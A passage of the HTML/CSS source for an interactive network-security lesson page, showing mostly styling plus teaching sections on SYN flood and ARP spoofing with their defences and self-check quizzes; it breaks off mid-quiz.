var(--cyan); display: block; }\n.hs-lbl { font-family: var(--mono); font-size: 9px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 3px; display: block; }\n.hero-scroll-hint {\n  font-family: var(--mono);\n  font-size: 10px;\n  color: var(--dim);\n  letter-spacing: 2px;\n  animation: pulse 2s ease-in-out infinite;\n}\n@keyframes pulse { 0%,100%{opacity:0.4} 50%{opacity:1} }\n\n/* ── NAV SIDEBAR ── */\n#layout {\n  display: flex;\n  position: relative;\n  z-index: 1;\n  max-width: 1300px;\n  margin: 0 auto;\n}\n#sidebar {\n  width: 260px;\n  flex-shrink: 0;\n  position: sticky;\n  top: 0;\n  height: 100vh;\n  overflow-y: auto;\n  border-right: 1px solid var(--border);\n  padding: 24px 0;\n  background: rgba(11,14,20,0.95);\n  backdrop-filter: blur(8px);\n}\n#sidebar::-webkit-scrollbar { width: 3px; }\n#sidebar::-webkit-scrollbar-thumb { background: var(--border2); }\n.sidebar-title {\n  font-family: var(--mono);\n  font-size: 9px;\n  letter-spacing: 3px;\n  color: var(--muted);\n  text-transform: uppercase;\n  padding: 0 20px 12px;\n  border-bottom: 1px solid var(--border);\n  margin-bottom: 8px;\n}\n.nav-item {\n  display: flex;\n  align-items: center;\n  gap: 10px;\n  padding: 9px 20px;\n  cursor: pointer;\n  border-left: 2px solid transparent;\n  transition: all 0.2s;\n  text-decoration: none;\n}\n.nav-item:hover { background: rgba(0,212,255,0.04); border-left-color: var(--cyan); }\n.nav-item.active { background: rgba(0,212,255,0.07); border-left-color: var(--cyan); }\n.nav-num {\n  font-family: var(--mono);\n  font-size: 10px;\n  color: var(--dim);\n  min-width: 22px;\n  letter-spacing: 1px;\n}\n.nav-item.active .nav-num { color: var(--cyan); }\n.nav-label { font-size: 12px; color: var(--muted); line-height: 1.3; }\n.nav-item.active .nav-label { color: var(--text); }\n.nav-tag {\n  margin-left: auto;\n  font-family: var(--mono);\n  font-size: 8px;\n  padding: 2px 6px;\n  border-radius: 3px;\n  letter-spacing: 1px;\n  text-transform: uppercase;\n}\n\n/* ── MAIN CONTENT ── */\n#main {\n  flex: 1;\n  padding: 0 0 80px;\n  min-width: 0;\n}\n.topic-section {\n  padding: 48px 40px;\n  border-bottom: 1px solid var(--border);\n  animation: fadeUp 0.5s ease both;\n  opacity: 0;\n}\n.topic-section.visible { opacity: 1; }\n@keyframes fadeUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }\n\n/* SECTION HEADER */\n.section-header {\n  display: flex;\n  align-items: flex-start;\n  gap: 20px;\n  margin-bottom: 32px;\n}\n.section-num {\n  font-family: var(--mono);\n  font-size: 11px;\n  color: var(--cyan);\n  letter-spacing: 3px;\n  flex-shrink: 0;\n  margin-top: 6px;\n}\n.section-title-wrap {}\n.section-title {\n  font-family: var(--display);\n  font-size: clamp(22px, 3vw, 32px);\n  font-weight: 800;\n  line-height: 1.2;\n  margin-bottom: 6px;\n}\n.section-meta {\n  font-family: var(--mono);\n  font-size: 10px;\n  color: var(--muted);\n  letter-spacing: 2px;\n  text-transform: uppercase;\n  display: flex;\n  gap: 16px;\n  flex-wrap: wrap;\n}\n.smeta-tag {\n  padding: 3px 10px;\n  border-radius: 4px;\n  border: 1px solid;\n}\n\n/* SCENARIO BOX */\n.scenario-card {\n  background: linear-gradient(135deg, rgba(255,181,71,0.05) 0%, transparent 60%);\n  border: 1px solid rgba(255,181,71,0.2);\n  border-left: 3px solid var(--amber);\n  border-radius: 6px;\n  padding: 20px 24px;\n  margin-bottom: 28px;\n  position: relative;\n}\n.scenario-card::before {\n  content: ''SCENARIO'';\n  font-family: var(--mono);\n  font-size: 8px;\n  letter-spacing: 3px;\n  color: var(--amber);\n  position: absolute;\n  top: -1px;\n  left: 20px;\n  background: var(--bg);\n  padding: 0 8px;\n  transform: translateY(-50%);\n}\n.scenario-text { font-size: 14px; line-height: 1.8; color: #c0c8d8; }\n.scenario-text mark { background: rgba(255,181,71,0.15); color: var(--amber); padding: 1px 5px; border-radius: 2px; font-style: normal; }\n.scenario-text code { font-family: var(--mono); font-size: 12px; background: rgba(74,140,255,0.12); color: var(--blue); padding: 2px 7px; border-radius: 3px; }\n\n/* WHAT IS IT */\n.concept-block {\n  background: var(--surface);\n  border: 1px solid var(--border2);\n  border-radius: 8px;\n  padding: 24px 28px;\n  margin-bottom: 20px;\n}\n.cb-label {\n  font-family: var(--mono);\n  font-size: 9px;\n  letter-spacing: 3px;\n  text-transform: uppercase;\n  margin-bottom: 14px;\n  display: flex;\n  align-items: center;\n  gap: 8px;\n}\n.cb-label::after { content:''''; flex:1; height:1px; background:var(--border2); }\n.cb-body { font-size: 14px; line-height: 1.85; color: #b0b8cc; }\n.cb-body strong { color: var(--text); font-weight: 600; }\n.cb-body em { color: var(--cyan); font-style: normal; font-family: var(--mono); font-size: 13px; }\n\n/* HOW IT WORKS STEPS */\n.steps-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));\n  gap: 12px;\n  margin-bottom: 20px;\n}\n.step-card {\n  background: var(--surface2);\n  border: 1px solid var(--border);\n  border-radius: 6px;\n  padding: 18px 16px;\n  position: relative;\n  overflow: hidden;\n  transition: border-color 0.2s;\n}\n.step-card:hover { border-color: var(--cyan); }\n.step-card::before {\n  content: attr(data-step);\n  font-family: var(--display);\n  font-size: 64px;\n  font-weight: 900;\n  color: rgba(255,255,255,0.03);\n  position: absolute;\n  right: 8px;\n  bottom: -8px;\n  line-height: 1;\n}\n.step-icon { font-size: 20px; margin-bottom: 10px; }\n.step-title { font-family: var(--mono); font-size: 11px; color: var(--cyan); letter-spacing: 1px; margin-bottom: 7px; }\n.step-desc { font-size: 12px; color: var(--muted); line-height: 1.6; }\n\n/* KEY CONCEPTS TAGS */\n.concepts-row {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 8px;\n  margin-bottom: 20px;\n}\n.concept-tag {\n  font-family: var(--mono);\n  font-size: 11px;\n  padding: 6px 14px;\n  border-radius: 4px;\n  border: 1px solid;\n  cursor: default;\n  transition: all 0.2s;\n}\n.concept-tag:hover { transform: translateY(-2px); }\n.ct-cyan { color: var(--cyan); border-color: rgba(0,212,255,0.3); background: rgba(0,212,255,0.06); }\n.ct-green { color: var(--green); border-color: rgba(0,232,122,0.3); background: rgba(0,232,122,0.06); }\n.ct-amber { color: var(--amber); border-color: rgba(255,181,71,0.3); background: rgba(255,181,71,0.06); }\n.ct-red { color: var(--red); border-color: rgba(255,79,107,0.3); background: rgba(255,79,107,0.06); }\n.ct-purple { color: var(--purple); border-color: rgba(180,127,255,0.3); background: rgba(180,127,255,0.06); }\n.ct-blue { color: var(--blue); border-color: rgba(74,140,255,0.3); background: rgba(74,140,255,0.06); }\n\n/* INTERACTIVE QUIZ */\n.quiz-block {\n  border: 1px solid var(--border2);\n  border-radius: 8px;\n  overflow: hidden;\n  margin-bottom: 20px;\n}\n.quiz-header {\n  background: var(--surface2);\n  padding: 14px 20px;\n  display: flex;\n  align-items: center;\n  gap: 10px;\n  border-bottom: 1px solid var(--border);\n}\n.quiz-header-icon { font-size: 16px; }\n.quiz-header-title { font-family: var(--mono); font-size: 11px; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; }\n.quiz-body { padding: 20px; }\n.quiz-question { font-size: 14px; font-weight: 500; color: var(--text); margin-bottom: 16px; line-height: 1.6; }\n.quiz-options { display: flex; flex-direction: column; gap: 8px; }\n.quiz-opt {\n  display: flex;\n  align-items: flex-start;\n  gap: 12px;\n  padding: 12px 16px;\n  border: 1px solid var(--border2);\n  border-radius: 6px;\n  cursor: pointer;\n  transition: all 0.2s;\n  background: transparent;\n  font-family: var(--body);\n  font-size: 13px;\n  color: var(--muted);\n  text-align: left;\n  width: 100%;\n}\n.quiz-opt:hover:not(:disabled) { border-color: var(--cyan); color: var(--text); background: rgba(0,212,255,0.04); }\n.quiz-opt.correct { border-color: var(--green) !important; background: rgba(0,232,122,0.08) !important; color: var(--green) !important; }\n.quiz-opt.wrong { border-color: var(--red) !important; background: rgba(255,79,107,0.08) !important; color: var(--red) !important; }\n.quiz-opt.reveal-correct { border-color: rgba(0,232,122,0.4) !important; background: rgba(0,232,122,0.04) !important; color: var(--green) !important; }\n.opt-letter {\n  font-family: var(--mono);\n  font-size: 11px;\n  min-width: 22px;\n  height: 22px;\n  border-radius: 4px;\n  border: 1px solid currentColor;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  flex-shrink: 0;\n  margin-top: 1px;\n}\n.quiz-feedback {\n  margin-top: 14px;\n  padding: 12px 16px;\n  border-radius: 6px;\n  font-size: 13px;\n  line-height: 1.6;\n  display: none;\n}\n.quiz-feedback.show { display: block; }\n.qf-correct { background: rgba(0,232,122,0.1); border: 1px solid rgba(0,232,122,0.3); color: var(--green); }\n.qf-wrong { background: rgba(255,79,107,0.1); border: 1px solid rgba(255,79,107,0.3); color: #ff8090; }\n.quiz-reset-btn {\n  margin-top: 12px;\n  font-family: var(--mono);\n  font-size: 10px;\n  letter-spacing: 2px;\n  padding: 8px 18px;\n  background: transparent;\n  border: 1px solid var(--border2);\n  color: var(--muted);\n  border-radius: 4px;\n  cursor: pointer;\n  display: none;\n  text-transform: uppercase;\n  transition: all 0.2s;\n}\n.quiz-reset-btn.show { display: block; }\n.quiz-reset-btn:hover { border-color: var(--cyan); color: var(--cyan); }\n\n/* ATTACK DIAGRAM */\n.diagram-block {\n  background: var(--surface);\n  border: 1px solid var(--border2);\n  border-radius: 8px;\n  padding: 24px;\n  margin-bottom: 20px;\n  overflow-x: auto;\n}\n.diagram-label {\n  font-family: var(--mono);\n  font-size: 9px;\n  letter-spacing: 3px;\n  color: var(--muted);\n  text-transform: uppercase;\n  margin-bottom: 20px;\n}\n.flow-row {\n  display: flex;\n  align-items: center;\n  gap: 0;\n  flex-wrap: nowrap;\n  min-width: max-content;\n}\n.flow-node {\n  padding: 10px 16px;\n  border-radius: 6px;\n  font-family: var(--mono);\n  font-size: 11px;\n  text-align: center;\n  line-height: 1.4;\n  min-width: 100px;\n}\n.fn-victim { background: rgba(255,79,107,0.12); border: 1px solid rgba(255,79,107,0.3); color: var(--red); }\n.fn-attacker { background: rgba(180,127,255,0.12); border: 1px solid rgba(180,127,255,0.3); color: var(--purple); }\n.fn-server { background: rgba(0,232,122,0.1); border: 1px solid rgba(0,232,122,0.3); color: var(--green); }\n.fn-network { background: rgba(74,140,255,0.1); border: 1px solid rgba(74,140,255,0.3); color: var(--blue); }\n.fn-warn { background: rgba(255,181,71,0.1); border: 1px solid rgba(255,181,71,0.3); color: var(--amber); }\n.fn-neutral { background: var(--surface2); border: 1px solid var(--border2); color: var(--muted); }\n.flow-arrow {\n  font-family: var(--mono);\n  font-size: 13px;\n  color: var(--dim);\n  padding: 0 8px;\n  flex-shrink: 0;\n}\n.flow-arrow.red { color: var(--red); }\n.flow-arrow.green { color: var(--green); }\n.flow-arrow.cyan { color: var(--cyan); }\n.flow-arrow.amber { color: var(--amber); }\n.flow-label { font-size: 10px; color: var(--dim); margin-top: 4px; font-family: var(--mono); }\n\n/* DEFENSE BOX */\n.defense-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));\n  gap: 12px;\n  margin-bottom: 20px;\n}\n.defense-card {\n  background: rgba(0,232,122,0.04);\n  border: 1px solid rgba(0,232,122,0.15);\n  border-radius: 6px;\n  padding: 16px 18px;\n  transition: border-color 0.2s;\n}\n.defense-card:hover { border-color: rgba(0,232,122,0.4); }\n.dc-icon { font-size: 18px; margin-bottom: 8px; }\n.dc-title { font-family: var(--mono); font-size: 11px; color: var(--green); margin-bottom: 6px; letter-spacing: 1px; }\n.dc-desc { font-size: 12px; color: var(--muted); line-height: 1.6; }\n\n/* COMPARISON TABLE */\n.compare-table {\n  width: 100%;\n  border-collapse: collapse;\n  margin-bottom: 20px;\n  font-size: 13px;\n}\n.compare-table th {\n  background: var(--surface2);\n  padding: 12px 16px;\n  font-family: var(--mono);\n  font-size: 10px;\n  letter-spacing: 2px;\n  text-transform: uppercase;\n  color: var(--cyan);\n  text-align: left;\n  border: 1px solid var(--border2);\n}\n.compare-table td {\n  padding: 11px 16px;\n  border: 1px solid var(--border);\n  color: var(--muted);\n  vertical-align: top;\n  line-height: 1.6;\n}\n.compare-table tr:hover td { background: rgba(255,255,255,0.02); }\n.td-label { color: var(--text); font-weight: 500; font-family: var(--mono); font-size: 11px; }\n.td-good { color: var(--green); }\n.td-bad { color: var(--red); }\n\n/* ACCORDION */\n.accordion {\n  border: 1px solid var(--border2);\n  border-radius: 8px;\n  overflow: hidden;\n  margin-bottom: 20px;\n}\n.accordion-item { border-bottom: 1px solid var(--border); }\n.accordion-item:last-child { border-bottom: none; }\n.accordion-trigger {\n  width: 100%;\n  background: none;\n  border: none;\n  padding: 16px 20px;\n  display: flex;\n  align-items: center;\n  gap: 12px;\n  cursor: pointer;\n  text-align: left;\n  transition: background 0.2s;\n  font-family: var(--body);\n}\n.accordion-trigger:hover { background: rgba(255,255,255,0.02); }\n.acc-arrow {\n  margin-left: auto;\n  font-size: 12px;\n  color: var(--dim);\n  transition: transform 0.3s;\n  flex-shrink: 0;\n}\n.accordion-trigger.open .acc-arrow { transform: rotate(180deg); color: var(--cyan); }\n.accordion-trigger.open { background: rgba(0,212,255,0.03); }\n.acc-title { font-size: 13px; color: var(--text); font-weight: 500; }\n.acc-badge {\n  font-family: var(--mono);\n  font-size: 9px;\n  padding: 2px 8px;\n  border-radius: 3px;\n  border: 1px solid;\n  letter-spacing: 1px;\n  text-transform: uppercase;\n}\n.accordion-body {\n  display: none;\n  padding: 0 20px 20px;\n  font-size: 13px;\n  color: var(--muted);\n  line-height: 1.75;\n  border-top: 1px solid var(--border);\n  padding-top: 16px;\n}\n.accordion-body.open { display: block; }\n.accordion-body strong { color: var(--text); }\n\n/* PROGRESS TRACKER */\n#progress-bar {\n  position: fixed;\n  top: 0;\n  left: 0;\n  height: 2px;\n  background: linear-gradient(90deg, var(--cyan), var(--purple));\n  z-index: 100;\n  transition: width 0.3s;\n  width: 0%;\n}\n\n/* TOPIC NAV BUTTONS */\n.topic-nav {\n  display: flex;\n  justify-content: space-between;\n  margin-top: 32px;\n  padding-top: 24px;\n  border-top: 1px solid var(--border);\n  gap: 12px;\n}\n.tnav-btn {\n  font-family: var(--mono);\n  font-size: 11px;\n  letter-spacing: 2px;\n  padding: 10px 20px;\n  border: 1px solid var(--border2);\n  border-radius: 4px;\n  cursor: pointer;\n  background: none;\n  color: var(--muted);\n  text-transform: uppercase;\n  transition: all 0.2s;\n  text-decoration: none;\n  display: inline-flex;\n  align-items: center;\n  gap: 8px;\n}\n.tnav-btn:hover { border-color: var(--cyan); color: var(--cyan); }\n.tnav-btn.primary { background: var(--cyan); color: var(--bg); border-color: var(--cyan); font-weight: 700; }\n.tnav-btn.primary:hover { background: #00b8e0; }\n\n/* MOBILE */\n@media (max-width: 900px) {\n  #sidebar { display: none; }\n  .topic-section { padding: 32px 20px; }\n}\n\n/* SCAN LINE EFFECT on scenario box */\n.scenario-card::after {\n  content: '''';\n  position: absolute;\n  inset: 0;\n  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(255,255,255,0.008) 3px, rgba(255,255,255,0.008) 4px);\n  pointer-events: none;\n  border-radius: 6px;\n}\n\n/* ── SCROLL TO TOP ── */\n#top-btn {\n  position: fixed;\n  bottom: 30px;\n  right: 30px;\n  width: 44px;\n  height: 44px;\n  background: var(--surface2);\n  border: 1px solid var(--border2);\n  border-radius: 50%;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  cursor: pointer;\n  z-index: 50;\n  font-size: 16px;\n  color: var(--muted);\n  transition: all 0.2s;\n  opacity: 0;\n  pointer-events: none;\n}\n#top-btn.show { opacity: 1; pointer-events: all; }\n#top-btn:hover { border-color: var(--cyan); color: var(--cyan); }\n\n/* INTRO banner */\n.intro-banner {\n  background: rgba(0,212,255,0.05);\n  border: 1px solid rgba(0,212,255,0.15);\n  border-radius: 8px;\n  padding: 20px 24px;\n  margin-bottom: 32px;\n  font-size: 14px;\n  color: #8899bb;\n  line-height: 1.7;\n}\n.intro-banner strong { color: var(--cyan); font-family: var(--mono); }\n\n/* HIGHLIGHT CALLOUT */\n.callout {\n  display: flex;\n  gap: 14px;\n  padding: 16px 18px;\n  border-radius: 6px;\n  margin-bottom: 16px;\n  font-size: 13px;\n  line-height: 1.6;\n  color: var(--muted);\n}\n.callout.warn { background: rgba(255,181,71,0.07); border: 1px solid rgba(255,181,71,0.2); }\n.callout.info { background: rgba(0,212,255,0.06); border: 1px solid rgba(0,212,255,0.18); }\n.callout.danger { background: rgba(255,79,107,0.07); border: 1px solid rgba(255,79,107,0.2); }\n.callout.success { background: rgba(0,232,122,0.06); border: 1px solid rgba(0,232,122,0.2); }\n.callout-icon { font-size: 18px; flex-shrink: 0; }\n.callout strong { color: var(--text); }\n</style>\n</head>\n<body>\n\n<div id="progress-bar"></div>\n<button id="top-btn" onclick="window.scrollTo({top:0,behavior:''smooth''})">↑</button>\n\n<!-- HERO -->\n<section id="hero">\n  <div class="hero-eyebrow">Interactive Lesson</div>\n  <h1 class="hero-h1">Network <span class="glow">Security</span><br>Fundamentals</h1>\n  <p class="hero-sub">A comprehensive, interactive guide to the 20 core attack scenarios, defence strategies, and architectural principles you need to master.</p>\n  <div class="hero-stats">\n    <div class="hs-cell"><span class="hs-val">20</span><span class="hs-lbl">Topics</span></div>\n    <div class="hs-cell"><span class="hs-val">20</span><span class="hs-lbl">Quizzes</span></div>\n    <div class="hs-cell"><span class="hs-val">60+</span><span class="hs-lbl">Key Concepts</span></div>\n  </div>\n  <div class="hero-scroll-hint">▼ scroll to begin</div>\n</section>\n\n<div id="layout">\n\n<!-- SIDEBAR NAV -->\n<nav id="sidebar">\n  <div class="sidebar-title">Topics</div>\n  <a class="nav-item" href="#t01"><span class="nav-num">01</span><span class="nav-label">SYN Flood / DDoS</span><span class="nav-tag ct-red">Attack</span></a>\n  <a class="nav-item" href="#t02"><span class="nav-num">02</span><span class="nav-label">ARP Spoofing</span><span class="nav-tag ct-red">L2</span></a>\n  <a class="nav-item" href="#t03"><span class="nav-num">03</span><span class="nav-label">SQL Injection</span><span class="nav-tag ct-red">Web</span></a>\n  <a class="nav-item" href="#t04"><span class="nav-num">04</span><span class="nav-label">PKI & TLS</span><span class="nav-tag ct-green">Crypto</span></a>\n  <a class="nav-item" href="#t05"><span class="nav-num">05</span><span class="nav-label">Ransomware</span><span class="nav-tag ct-red">Malware</span></a>\n  <a class="nav-item" href="#t06"><span class="nav-num">06</span><span class="nav-label">VLAN Hopping</span><span class="nav-tag ct-amber">L2</span></a>\n  <a class="nav-item" href="#t07"><span class="nav-num">07</span><span class="nav-label">DNS Tunneling</span><span class="nav-tag ct-red">C2</span></a>\n  <a class="nav-item" href="#t08"><span class="nav-num">08</span><span class="nav-label">WEP / RC4 Flaw</span><span class="nav-tag ct-red">Wireless</span></a>\n  <a class="nav-item" href="#t09"><span class="nav-num">09</span><span class="nav-label">Firewall Rules</span><span class="nav-tag ct-amber">Config</span></a>\n  <a class="nav-item" href="#t10"><span class="nav-num">10</span><span class="nav-label">Ping of Death</span><span class="nav-tag ct-purple">Legacy</span></a>\n  <a class="nav-item" href="#t11"><span class="nav-num">11</span><span class="nav-label">BEC / SPF·DKIM</span><span class="nav-tag ct-amber">Email</span></a>\n  <a class="nav-item" href="#t12"><span class="nav-num">12</span><span class="nav-label">DMZ Architecture</span><span class="nav-tag ct-green">Design</span></a>\n  <a class="nav-item" href="#t13"><span class="nav-num">13</span><span class="nav-label">Zero Trust</span><span class="nav-tag ct-green">Arch</span></a>\n  <a class="nav-item" href="#t14"><span class="nav-num">14</span><span class="nav-label">IDS vs IPS</span><span class="nav-tag ct-cyan">Detection</span></a>\n  <a class="nav-item" href="#t15"><span class="nav-num">15</span><span class="nav-label">TLS MitM</span><span class="nav-tag ct-red">Crypto</span></a>\n  <a class="nav-item" href="#t16"><span class="nav-num">16</span><span class="nav-label">VLAN + ACL Seg.</span><span class="nav-tag ct-green">Design</span></a>\n  <a class="nav-item" href="#t17"><span class="nav-num">17</span><span class="nav-label">Rogue VPN / DLP</span><span class="nav-tag ct-amber">Endpoint</span></a>\n  <a class="nav-item" href="#t18"><span class="nav-num">18</span><span class="nav-label">Cloud Bucket Leak</span><span class="nav-tag ct-red">Cloud</span></a>\n  <a class="nav-item" href="#t19"><span class="nav-num">19</span><span class="nav-label">Port Scanning</span><span class="nav-tag ct-amber">Recon</span></a>\n  <a class="nav-item" href="#t20"><span class="nav-num">20</span><span class="nav-label">XSS Attacks</span><span class="nav-tag ct-red">Web</span></a>\n</nav>\n\n<!-- MAIN -->\n<main id="main">\n\n<!-- ══════════════════════════════════ T01 SYN FLOOD ══════════════════════════════════ -->\n<section class="topic-section" id="t01">\n  <div class="section-header">\n    <div class="section-num">// 01</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">SYN Flood & TCP State Exhaustion</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">DoS / DDoS Attack</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Transport Layer</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">An e-commerce site <mark>ShopFast</mark> is receiving millions of <code>SYN</code> packets per second from thousands of spoofed IP addresses. The server''s connection table fills up, and legitimate customers receive <code>Connection timed out</code> errors. CPU utilisation is at 100% but bandwidth is only at 15%.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">What Is It?</div>\n    <div class="cb-body">\n      A <strong>SYN Flood</strong> is a Denial-of-Service attack that exploits the TCP three-way handshake. TCP connections begin with: <em>SYN</em> → <em>SYN-ACK</em> → <em>ACK</em>. The attacker sends enormous volumes of <em>SYN</em> packets with <strong>spoofed (fake) source IP addresses</strong>. The server sends <em>SYN-ACK</em> replies and waits for the final <em>ACK</em> — which never arrives. Each half-open connection occupies a slot in the server''s <strong>connection state table</strong> (TCB). When the table is full, the server cannot accept new legitimate connections.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">Attack Flow</div>\n    <div class="flow-row">\n      <div class="flow-node fn-attacker">Attacker<br><small>Spoofed IPs</small></div>\n      <div class="flow-arrow red">──SYN──▶</div>\n      <div class="flow-node fn-network">Server<br><small>Allocates TCB slot</small></div>\n      <div class="flow-arrow amber">◀─SYN-ACK─</div>\n      <div class="flow-node fn-victim">Ghost IP<br><small>Never responds</small></div>\n    </div>\n    <div style="margin-top:14px;" class="flow-row">\n      <div class="flow-node fn-victim">Legit User</div>\n      <div class="flow-arrow" style="color:var(--red)">──SYN──▶</div>\n      <div class="flow-node fn-warn">Server<br><small>Table FULL → DROP</small></div>\n    </div>\n  </div>\n\n  <div class="steps-grid">\n    <div class="step-card" data-step="1">\n      <div class="step-icon">📡</div>\n      <div class="step-title">SYN Packet Sent</div>\n      <div class="step-desc">Attacker crafts millions of SYN packets using spoofed source IPs from bots or a single machine.</div>\n    </div>\n    <div class="step-card" data-step="2">\n      <div class="step-icon">🧠</div>\n      <div class="step-title">Server Allocates State</div>\n      <div class="step-desc">Server stores a half-open connection record (Transmission Control Block) and replies with SYN-ACK.</div>\n    </div>\n    <div class="step-card" data-step="3">\n      <div class="step-icon">⏳</div>\n      <div class="step-title">Timeout Wait</div>\n      <div class="step-desc">No ACK arrives (the source IP is fake). Server waits for timeout (typically 75 seconds by default).</div>\n    </div>\n    <div class="step-card" data-step="4">\n      <div class="step-icon">💥</div>\n      <div class="step-title">Table Exhaustion</div>\n      <div class="step-desc">Connection table fills. New SYNs from real users are silently dropped. Service is down.</div>\n    </div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--green)">Key Defences</div>\n    <div class="cb-body">\n      <strong>SYN Cookies:</strong> Instead of allocating state on receiving a SYN, the server encodes connection data in the <em>sequence number</em> of the SYN-ACK. State is only allocated when a valid ACK with the correct number arrives — eliminating half-open slot exhaustion.<br><br>\n      <strong>Rate Limiting:</strong> Firewalls drop SYNs exceeding a defined threshold per source IP per second.<br><br>\n      <strong>Scrubbing Centres / CDN DDoS Protection:</strong> Services like Cloudflare absorb traffic before it reaches origin infrastructure.\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-cyan">TCP Handshake</span>\n    <span class="concept-tag ct-red">SYN Flood</span>\n    <span class="concept-tag ct-amber">Half-Open Connection</span>\n    <span class="concept-tag ct-green">SYN Cookies</span>\n    <span class="concept-tag ct-blue">TCB Table</span>\n    <span class="concept-tag ct-purple">Spoofed IP</span>\n    <span class="concept-tag ct-red">DoS</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">Why does a SYN Flood exhaust server resources even at low bandwidth utilisation?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The server runs out of disk space storing logs.'')"><span class="opt-letter">A</span>The server runs out of disk space storing connection logs.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''correct'',''✓ Correct! Each half-open SYN consumes a state table slot (TCB). The table has a finite size. CPU overhead comes from managing these entries — not raw bandwidth.'')"><span class="opt-letter">B</span>Each SYN allocates a half-open state entry. The table has finite size regardless of traffic volume.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''SYN packets carry encrypted payloads that require decryption.'')"><span class="opt-letter">C</span>SYN packets carry encrypted payloads that require heavy CPU decryption.</button>\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''The attacker saturates the NIC receive buffer first.'')"><span class="opt-letter">D</span>The NIC receive buffer fills before the connection table.</button>\n      </div>\n      <div class="quiz-feedback"></div>\n      <button class="quiz-reset-btn" onclick="resetQ(this)">↺ Try Again</button>\n    </div>\n  </div>\n</section>\n\n<!-- ══════════════════════════════════ T02 ARP SPOOFING ══════════════════════════════════ -->\n<section class="topic-section" id="t02">\n  <div class="section-header">\n    <div class="section-num">// 02</div>\n    <div class="section-title-wrap">\n      <h2 class="section-title">ARP Spoofing & Layer 2 Poisoning</h2>\n      <div class="section-meta">\n        <span class="smeta-tag ct-red" style="border-color:rgba(255,79,107,0.3)">MitM Attack</span>\n        <span class="smeta-tag ct-amber" style="border-color:rgba(255,181,71,0.3)">Layer 2 / Data Link</span>\n      </div>\n    </div>\n  </div>\n\n  <div class="scenario-card">\n    <div class="scenario-text">On a corporate LAN, an attacker sends unsolicited ARP replies claiming <mark>their MAC address</mark> corresponds to the <code>192.168.1.1</code> gateway IP. All hosts update their ARP caches. All traffic meant for the router now passes through the attacker''s machine first.</div>\n  </div>\n\n  <div class="concept-block">\n    <div class="cb-label" style="color:var(--cyan)">Background: How ARP Works</div>\n    <div class="cb-body">\n      <strong>ARP (Address Resolution Protocol)</strong> maps IP addresses to MAC addresses on a local subnet. When Host A wants to send data to <em>192.168.1.5</em>, it broadcasts: <em>"Who has 192.168.1.5? Tell 192.168.1.10."</em> The owner replies with their MAC, and Host A caches this mapping.<br><br>\n      The critical weakness: <strong>ARP is stateless and unauthenticated</strong>. Any host can send an ARP reply at any time, and other hosts will accept it and update their cache. There is no verification of who is the legitimate owner of an IP address.\n    </div>\n  </div>\n\n  <div class="diagram-block">\n    <div class="diagram-label">ARP Cache Poisoning</div>\n    <div style="margin-bottom:14px;" class="flow-row">\n      <div class="flow-node fn-victim">Host A<br><small>192.168.1.10</small></div>\n      <div class="flow-arrow cyan">◀──Fake ARP Reply──</div>\n      <div class="flow-node fn-attacker">Attacker<br><small>"I am 192.168.1.1"</small></div>\n    </div>\n    <div class="flow-row">\n      <div class="flow-node fn-victim">Host A<br><small>Sends to "gateway"</small></div>\n      <div class="flow-arrow red">──Traffic──▶</div>\n      <div class="flow-node fn-attacker">Attacker<br><small>Reads/Modifies</small></div>\n      <div class="flow-arrow green">──Forwards──▶</div>\n      <div class="flow-node fn-server">Real Gateway<br><small>192.168.1.1</small></div>\n    </div>\n  </div>\n\n  <div class="defense-grid">\n    <div class="defense-card">\n      <div class="dc-icon">🛡️</div>\n      <div class="dc-title">Dynamic ARP Inspection (DAI)</div>\n      <div class="dc-desc">Managed switches validate ARP packets against a trusted DHCP snooping binding table. Invalid ARPs are dropped at the port.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">📌</div>\n      <div class="dc-title">Static ARP Entries</div>\n      <div class="dc-desc">Critical mappings (e.g. default gateway) are manually set and cannot be overwritten by rogue ARP replies.</div>\n    </div>\n    <div class="defense-card">\n      <div class="dc-icon">🔍</div>\n      <div class="dc-title">ARP Watch / SIEM</div>\n      <div class="dc-desc">Monitor for IP-to-MAC mapping changes. Sudden changes for gateway IPs trigger alerts.</div>\n    </div>\n  </div>\n\n  <div class="concepts-row">\n    <span class="concept-tag ct-cyan">ARP Protocol</span>\n    <span class="concept-tag ct-red">ARP Poisoning</span>\n    <span class="concept-tag ct-red">MitM</span>\n    <span class="concept-tag ct-amber">MAC Address</span>\n    <span class="concept-tag ct-green">DAI</span>\n    <span class="concept-tag ct-green">DHCP Snooping</span>\n    <span class="concept-tag ct-blue">Layer 2</span>\n  </div>\n\n  <div class="quiz-block">\n    <div class="quiz-header"><span class="quiz-header-icon">🧠</span><span class="quiz-header-title">Quick Check</span></div>\n    <div class="quiz-body">\n      <div class="quiz-question">What fundamental design weakness in ARP enables poisoning attacks?</div>\n      <div class="quiz-options">\n        <button class="quiz-opt" onclick="checkQ(this,''wrong'',''ARP operates at Layer 